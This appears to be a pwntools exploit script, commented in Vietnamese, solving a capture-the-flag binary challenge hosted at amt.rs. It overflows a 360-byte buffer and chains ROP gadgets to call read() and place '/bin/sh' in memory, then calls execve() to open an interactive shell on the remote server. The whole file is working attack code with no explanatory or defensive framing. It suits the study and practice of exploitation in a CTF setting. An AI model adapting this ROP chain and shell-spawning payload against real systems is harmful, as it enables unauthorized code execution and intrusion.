from pwn import *

# --- CẤU HÌNH ---
# exe = ELF('./chal')
# context.binary = exe
# p = process('./chal')
p = remote('amt.rs', 27193)

# --- OFFSET & ADDRESS ---
offset = 360
rw_section = 0x010d6100      # Vùng nhớ để ghi "/bin/sh"

# --- GADGETS (Đã tổng hợp từ các bước trước) ---
pop_rax = 0x00000000010c5cc4
pop_rdx = 0x00000000010cf9ec

# Gadget: pop rdi ; pop rbp ; ret
pop_rdi_rbp = 0x0000000001050fc0 

# Gadget: pop rsi ; pop rbp ; ret (Vừa tìm thấy)
pop_rsi_rbp = 0x000000000104a153 

# Địa chỉ lệnh syscall nằm trong hàm os.linux.x86_64.syscall3
# Lưu ý: Sau lệnh syscall này là 'add rsp, 0x38; pop rbp; ret'
# Nên ta cần padding 56 bytes + 8 bytes = 64 bytes sau mỗi lần gọi syscall
syscall_addr = 0x0000000001076649

# --- TẠO PAYLOAD ---
payload = b"A" * offset

# =========================================================
# GIAI ĐOẠN 1: read(0, rw_section, 59)
# =========================================================

# 1. Set RDI = 0 (stdin)
payload += p64(pop_rdi_rbp)
payload += p64(0)            # rdi
payload += p64(0)            # rbp (rác)

# 2. Set RSI = rw_section (buffer)
payload += p64(pop_rsi_rbp)
payload += p64(rw_section)   # rsi
payload += p64(0)            # rbp (rác)

# 3. Set RDX = 59 (độ dài)
payload += p64(pop_rdx)
payload += p64(59)

# 4. Set RAX = 0 (syscall read)
payload += p64(pop_rax)
payload += p64(0)

# 5. Gọi Syscall
payload += p64(syscall_addr)
# Padding để xử lý stack cleanup của hàm syscall3 (add rsp, 0x38; pop rbp)
payload += b"P" * (0x38 + 8) 

# =========================================================
# GIAI ĐOẠN 2: execve(rw_section, 0, 0)
# =========================================================

# 1. Set RDI = rw_section (ptr to "/bin/sh")
payload += p64(pop_rdi_rbp)
payload += p64(rw_section)   # rdi
payload += p64(0)            # rbp (rác)

# 2. Set RSI = 0
payload += p64(pop_rsi_rbp)
payload += p64(0)            # rsi
payload += p64(0)            # rbp (rác)

# 3. Set RDX = 0
payload += p64(pop_rdx)
payload += p64(0)

# 4. Set RAX = 59 (syscall execve)
payload += p64(pop_rax)
payload += p64(59)

# 5. Gọi Syscall (Lấy shell!)
payload += p64(syscall_addr)
# Không cần padding ở đây nữa vì ta đã có shell

# --- GỬI ---
print("[*] Sending ROP Chain...")
# Đọc dòng chào mừng đầu tiên
try:
    p.recvuntil(b"pwn.\n")
except:
    pass

p.send(payload)

# Đợi payload 1 thực thi xong syscall read
time.sleep(0.5)

print("[*] Sending /bin/sh...")
p.send(b"/bin/sh\0")

# Tương tác
p.interactive()